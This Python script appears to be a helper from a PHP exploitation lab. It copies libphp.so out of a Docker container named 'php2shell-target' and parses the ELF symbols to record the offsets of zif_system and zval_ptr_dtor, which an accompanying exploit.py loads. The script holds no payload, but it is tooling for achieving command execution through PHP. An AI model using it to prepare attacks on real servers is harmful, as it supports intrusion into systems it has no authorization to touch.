#!/usr/bin/env python3
"""
Read zif_system / zval_ptr_dtor offsets from the official image's libphp.so.

The official php:8.4.26-apache image is built by the Docker PHP maintainers,
not by this repository, so its libphp layout differs from the lab build.
This script copies libphp.so out of the running container and parses the ELF
symbol table directly -- no binutils needed inside the container -- then writes

    out/offsets.env      ZIF_OFFSET=0x... DTOR_OFFSET=0x...

which exploit.py loads automatically.

Usage:
    python3 archive/legacy-8m/docker/offsets.py [container] [output]
"""

from __future__ import annotations

import os
import struct
import subprocess
import sys
import tempfile

LIB = "/usr/lib/apache2/modules/libphp.so"
HERE = os.path.dirname(os.path.abspath(__file__))
_ROOT = os.path.abspath(os.path.join(HERE, "..", "..", ".."))
DEFAULT_CONTAINER = "php2shell-target"
DEFAULT_OUTPUT = os.path.join(_ROOT, "out", "offsets.env")

SHT_SYMTAB = 2
SHT_DYNSYM = 11
PT_LOAD = 1


def copy_lib(container: str) -> str:
    fd, path = tempfile.mkstemp(prefix="libphp-", suffix=".so")
    os.close(fd)
    try:
        subprocess.run(
            ["docker", "cp", f"{container}:{LIB}", path],
            check=True, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE,
        )
    except FileNotFoundError:
        raise SystemExit("docker not found in PATH")
    except subprocess.CalledProcessError as e:
        os.unlink(path)
        raise SystemExit(
            f"cannot copy {LIB} from container {container!r}: "
            f"{e.stderr.decode(errors='replace').strip()}"
        )
    return path


def parse_elf(path: str) -> tuple[int, dict[str, int]]:
    data = open(path, "rb").read()
    if data[:4] != b"\x7fELF" or data[4] != 2 or data[5] != 1:
        raise SystemExit("libphp.so is not a little-endian ELF64 file")

    e_phoff, = struct.unpack_from("<Q", data, 0x20)
    e_shoff, = struct.unpack_from("<Q", data, 0x28)
    e_phentsize, e_phnum = struct.unpack_from("<HH", data, 0x36)
    e_shentsize, e_shnum = struct.unpack_from("<HH", data, 0x3A)

    # PT_LOAD base: symbol st_value values are virtual addresses.
    loads = []
    for i in range(e_phnum):
        off = e_phoff + i * e_phentsize
        p_type, = struct.unpack_from("<I", data, off)
        p_vaddr, = struct.unpack_from("<Q", data, off + 16)
        p_memsz, = struct.unpack_from("<Q", data, off + 40)
        if p_type == PT_LOAD and p_memsz:
            loads.append(p_vaddr)
    if not loads:
        raise SystemExit("no PT_LOAD segment")
    bias = min(loads)

    sections = []
    for i in range(e_shnum):
        off = e_shoff + i * e_shentsize
        sh_name, sh_type = struct.unpack_from("<II", data, off)
        sh_offset, sh_size = struct.unpack_from("<QQ", data, off + 24)
        sh_link, = struct.unpack_from("<I", data, off + 40)
        sh_entsize, = struct.unpack_from("<Q", data, off + 56)
        sections.append({
            "name_off": sh_name, "type": sh_type, "offset": sh_offset,
            "size": sh_size, "link": sh_link, "entsize": sh_entsize,
        })

    wanted = {"zif_system": None, "zval_ptr_dtor": None}
    for sec in sections:
        if sec["type"] not in (SHT_SYMTAB, SHT_DYNSYM):
            continue
        strtab = sections[sec["link"]] if sec["link"] < len(sections) else None
        if strtab is None:
            continue
        entsize = sec["entsize"] or 24
        count = sec["size"] // entsize
        for i in range(count):
            off = sec["offset"] + i * entsize
            st_name, = struct.unpack_from("<I", data, off)
            st_value, = struct.unpack_from("<Q", data, off + 8)
            if st_name == 0:
                continue
            name_off = strtab["offset"] + st_name
            end = data.find(b"\x00", name_off)
            if end < 0:
                continue
            name = data[name_off:end].decode("ascii", "replace")
            if name in wanted and wanted[name] is None:
                wanted[name] = st_value

    missing = [name for name, val in wanted.items() if val is None]
    if missing:
        raise SystemExit("symbols not found in libphp.so: " + ", ".join(missing))
    return bias, {k: v for k, v in wanted.items() if v is not None}


def main() -> int:
    container = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_CONTAINER
    output = sys.argv[2] if len(sys.argv) > 2 else DEFAULT_OUTPUT

    path = copy_lib(container)
    try:
        bias, syms = parse_elf(path)
    finally:
        os.unlink(path)

    zif = syms["zif_system"] - bias
    dtor = syms["zval_ptr_dtor"] - bias

    os.makedirs(os.path.dirname(output), exist_ok=True)
    with open(output, "w", encoding="utf-8") as f:
        f.write(f"ZIF_OFFSET=0x{zif:x}\n")
        f.write(f"DTOR_OFFSET=0x{dtor:x}\n")

    print(f"zif_system     0x{zif:x}")
    print(f"zval_ptr_dtor  0x{dtor:x}")
    print(f"wrote {output}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
